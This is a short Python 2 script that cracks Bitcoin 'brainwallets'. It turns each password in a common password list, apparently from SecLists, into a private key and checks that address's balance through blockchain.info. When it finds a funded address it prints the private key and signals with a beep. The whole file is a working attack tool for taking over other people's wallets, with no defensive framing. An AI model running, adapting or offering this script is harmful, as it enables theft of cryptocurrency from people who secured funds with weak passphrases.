from pybitcoin import BitcoinPrivateKey
import urllib2, time, datetime, winsound, sys

def check_bitcoin_balance(passphrase=None):
	skey = BitcoinPrivateKey.from_passphrase(passphrase)
	addr = skey.public_key().address()
	url  = 'http://blockchain.info/es/q/addressbalance/'+ addr
	bal  = urllib2.urlopen(url).read()
	return addr, skey.to_wif(), bal


# Check bitcoin balances of few addresses generated from random private keys (2^160 bitcoin addresses exist!!)

for i in range(5):
		
	addr, skey, bal = check_bitcoin_balance()

	print skey, bal

	if bal != '0':
		winsound.Beep(2500, 10000)
		sys.exit(0)

	time.sleep(1.5)


#https://github.com/danielmiessler/SecLists/tree/master/Passwords

filepath = 'merged.txt'
with open(filepath) as fp:
	
	line = fp.readline().strip()
	
	while line:	
		
		addr, skey, bal = check_bitcoin_balance(passphrase = line)
		
		print bal, line
		
		if bal != '0':
			print 'skey', skey
			winsound.Beep(2500, 10000)
			sys.exit(0)
		
		line = fp.readline().strip()
		time.sleep(1.5)